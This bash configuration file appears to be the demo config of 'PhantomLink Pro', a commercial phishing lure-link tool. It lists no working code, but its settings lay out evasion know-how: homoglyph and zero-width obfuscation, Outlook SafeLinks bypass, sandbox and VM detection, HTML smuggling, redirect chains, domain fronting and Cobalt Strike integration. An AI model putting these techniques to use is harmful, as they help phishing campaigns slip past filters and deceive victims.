#!/bin/bash
# PhantomLink Pro - Demo Configuration File
# This demonstrates how the full version can be configured
# Copy this file to phantomlink.config and customize for your needs

#############################################
# BASIC CONFIGURATION
#############################################

# Default target domain for lure pages
DEFAULT_LURE_DOMAIN="secure-auth.example.com"

# Default output directory
DEFAULT_OUTPUT_DIR="./phantom_campaigns"

# Default obfuscation technique
DEFAULT_TECHNIQUE="polymorphic"

# Enable logging
ENABLE_LOGGING=true
LOG_LEVEL="INFO" # DEBUG, INFO, WARNING, ERROR

#############################################
# OBFUSCATION SETTINGS
#############################################

# Zero-width character insertion probability (0-100)
ZERO_WIDTH_PROBABILITY=80

# Homoglyph substitution level (1-3)
# 1 = Basic (5-10 substitutions)
# 2 = Medium (15-20 substitutions)
# 3 = Maximum (30+ substitutions)
HOMOGLYPH_LEVEL=3

# JavaScript obfuscation complexity (1-5)
JS_COMPLEXITY=4

# Enable Unicode normalization bypass
UNICODE_BYPASS=true

#############################################
# SECURITY FEATURES
#############################################

# Token binding settings
TOKEN_BINDING_DEFAULT=true
TOKEN_ENTROPY_BITS=128
TOKEN_HASH_ALGORITHM="SHA256"

# Expiration defaults
DEFAULT_EXPIRE_HOURS=24
DEFAULT_CLICK_LIMIT=10

# Anti-analysis features
ENABLE_VM_DETECTION=true
ENABLE_DEBUGGER_DETECTION=true
ENABLE_SANDBOX_DETECTION=true
DETECTION_SENSITIVITY="HIGH" # LOW, MEDIUM, HIGH

#############################################
# PLATFORM OPTIMIZATION
#############################################

# Platform-specific settings
DISCORD_EMBED_THUMBNAIL=true
SLACK_UNFURL_LINKS=false
TEAMS_ADAPTIVE_CARD=true
OUTLOOK_SAFELINKS_BYPASS=true

# Mobile optimization
MOBILE_REDIRECT_DELAY=500
DESKTOP_REDIRECT_DELAY=1000

#############################################
# NOTIFICATION SETTINGS
#############################################

# Webhook configuration
WEBHOOK_TIMEOUT=5
WEBHOOK_RETRY_COUNT=3
WEBHOOK_USER_AGENT="PhantomLink/2.5"

# Telegram settings
TELEGRAM_API_ENDPOINT="https://api.telegram.org"
TELEGRAM_PARSE_MODE="MarkdownV2"
TELEGRAM_DISABLE_PREVIEW=true

# Email notifications (full version only)
SMTP_SERVER=""
SMTP_PORT=587
SMTP_FROM=""
SMTP_AUTH_USER=""
SMTP_AUTH_PASS=""

#############################################
# ADVANCED FEATURES
#############################################

# Redirect chain configuration
MAX_REDIRECT_DEPTH=5
REDIRECT_DELAY_MIN=300
REDIRECT_DELAY_MAX=1500
REDIRECT_METHODS=("meta" "javascript" "iframe" "http-equiv")

# Polymorphic engine settings
POLY_PATTERNS=6
POLY_VAR_LENGTH_MIN=4
POLY_VAR_LENGTH_MAX=12
POLY_TIMING_FUZZING=true

# HTML smuggling options
SMUGGLE_COMPRESSION=true
SMUGGLE_CHUNK_SIZE=4096
SMUGGLE_DECODE_DELAY=200

#############################################
# INFRASTRUCTURE SETTINGS
#############################################

# CDN configuration (full version)
USE_CDN=true
CDN_PROVIDERS=("cloudflare" "fastly" "akamai")
CDN_ROTATION=true

# Domain fronting settings
DOMAIN_FRONTING=false
FRONT_DOMAINS=()

# Load balancing
ENABLE_LOAD_BALANCING=true
BACKEND_SERVERS=()

#############################################
# OPERATIONAL SECURITY
#############################################

# Campaign tracking
TRACK_CAMPAIGNS=true
CAMPAIGN_ID_LENGTH=16

# Data retention
LOG_RETENTION_DAYS=30
TOKEN_RETENTION_DAYS=7

# Operational modes
PARANOID_MODE=false # Maximum security, all features enabled
QUIET_MODE=false    # Minimal output
DEMO_MODE=true      # This is the demo version

#############################################
# INTEGRATION SETTINGS
#############################################

# API configuration (full version)
API_ENABLED=false
API_PORT=8443
API_AUTH_REQUIRED=true
API_RATE_LIMIT=100

# Database settings (full version)
DB_TYPE="sqlite" # sqlite, mysql, postgresql
DB_PATH="./phantomlink.db"
DB_ENCRYPTION=true

# External tool integration
INTEGRATE_COBALT_STRIKE=false
INTEGRATE_METASPLOIT=false
INTEGRATE_EMPIRE=false

#############################################
# CUSTOM HANDLERS
#############################################

# Custom JavaScript injection
CUSTOM_JS_ENABLED=false
CUSTOM_JS_FILE=""

# Custom CSS for lure pages
CUSTOM_CSS_ENABLED=false
CUSTOM_CSS_FILE=""

# Custom redirect logic
CUSTOM_REDIRECT_HANDLER=""

#############################################
# DEMO LIMITATIONS
#############################################

# The following features are disabled in demo mode:
# - Full homoglyph character set
# - Zero-width character insertion
# - Advanced polymorphic JavaScript
# - Token binding and validation
# - HTML smuggling
# - Multi-stage redirect chains
# - Platform-specific optimizations
# - Real-time notifications
# - Anti-analysis features
# - Custom payloads
# - API access
# - Database storage

echo "Note: This is a demo configuration file."
echo "Full functionality requires the professional version."